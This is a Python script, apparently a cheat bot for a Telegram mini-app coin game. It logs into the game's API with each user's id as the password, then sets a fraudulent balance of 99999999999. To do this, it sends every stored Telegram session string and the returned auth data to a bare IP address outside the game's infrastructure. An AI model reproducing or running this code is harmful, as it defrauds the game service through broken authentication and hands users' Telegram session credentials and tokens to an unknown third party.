import os
import json
import requests
import time
from urllib.parse import urlparse, parse_qs
from user_agent import generate_user_agent
from colorama import Fore, Style, init
import pyfiglet  # Make sure to import pyfiglet

# Generate a user agent for Android
user_agent = generate_user_agent('android')
headers = {
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'x-requested-with': 'org.telegram.plus',
}

init(autoreset=True)

def main_wcoin(session, amount, key):
    parsed_url = urlparse(session)
    query_params = parse_qs(parsed_url.fragment)
    tgWebAppData = query_params.get('tgWebAppData', [None])[0]
    user_data = parse_qs(tgWebAppData)['user'][0]
    user_data = json.loads(user_data)
    identifier = str(user_data['id'])
    json_data = {
        'identifier': identifier,
        'password': identifier,
    }
    res = requests.post('https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', json=json_data).json()
    r = requests.post('http://213.218.240.167:5000/private', json={'initData': session, 'serverData': res, 'amount': amount, 'key': key})
    return r.json()

def next_wait():
    print(Fore.YELLOW + "Waiting for 5 seconds before processing the next account...")
    for i in range(5, -1, -1):  # 5 seconds countdown
        mins, secs = divmod(i, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(f"\rCountdown: {timer}", end="", flush=True)
        time.sleep(1)  # Wait for 1 second
    print()  # Print a newline after the countdown

def load_sessions():
    with open('session.txt', 'r') as file:
        return [line.strip() for line in file.readlines()]

def restart_script():
    for i in range(10, -1, -1):
        mins, secs = divmod(i, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(f"\rRestarting in: {timer}", end="", flush=True)
        time.sleep(1)  # Wait for 1 second
    main()  # Call the main function again to restart

def print_info_box(social_media_usernames):
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTWHITE_EX]
    
    box_width = max(len(social) + len(username) for social, username in social_media_usernames) + 4
    print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width) + '+')
    
    for i, (social, username) in enumerate(social_media_usernames):
        color = colors[i % len(colors)]  # Cycle through colors
        print(color + f'| {social}: {username} |')
    
    print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width) + '+')

def create_gradient_banner(text):
    banner = pyfiglet.figlet_format(text, font='slant').splitlines()
    colors = [Fore.GREEN + Style.BRIGHT, Fore.YELLOW + Style.BRIGHT, Fore.RED + Style.BRIGHT]
    total_lines = len(banner)
    section_size = total_lines // len(colors)

    for i, line in enumerate(banner):
        if i < section_size:
            print(colors[0] + line)  # Green
        elif i < section_size * 2:
            print(colors[1] + line)  # Yellow
        else:
            print(colors[2] + line)  # Red

def main():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear console
    
    # Add the gradient banner and social media info here
    banner_text = "NAHID HASAN ARIF"
    create_gradient_banner(banner_text)
    
    social_media_usernames = [("Coder", "Nahid Hasan Arif")]
    print_info_box(social_media_usernames)
    print(Fore.GREEN + Style.BRIGHT + "=== Processing Sessions ===")

    # Load all sessions from session.txt
    sessions = load_sessions()
    balance_input = 99999999999  # Hardcoded balance
    key = "GWWT"  # Hardcoded key

    for session in sessions:
        data = main_wcoin(session, int(balance_input), key)
        os.system('cls' if os.name == 'nt' else 'clear')
        
        try:
            print(Fore.GREEN + Style.BRIGHT + "=== User Information ===")
            print(Fore.YELLOW + f"Username: {data['username']}")
            print(Fore.CYAN + f"Email: {data['email']}")
            print(Fore.MAGENTA + f"Telegram Username: {data['telegram_username']}")
            print(Fore.BLUE + f"Balance: {data['balance']}")
            print(Fore.LIGHTWHITE_EX + f"Clicks: {data['clicks']}")
            print(Fore.WHITE + f"Max Energy: {data['max_energy']}")
            print(Fore.GREEN + Style.BRIGHT + f"Created At: {data['createdAt']}")
            print(Fore.GREEN + Style.BRIGHT + "========================")
        except KeyError:
            print(Fore.RED + Style.BRIGHT + data.get('error', 'Unknown error occurred'))
        
        next_wait()

if __name__ == "__main__":
    while True:  # Loop to keep the script running
        main()
        restart_script()  # Restart the script after processing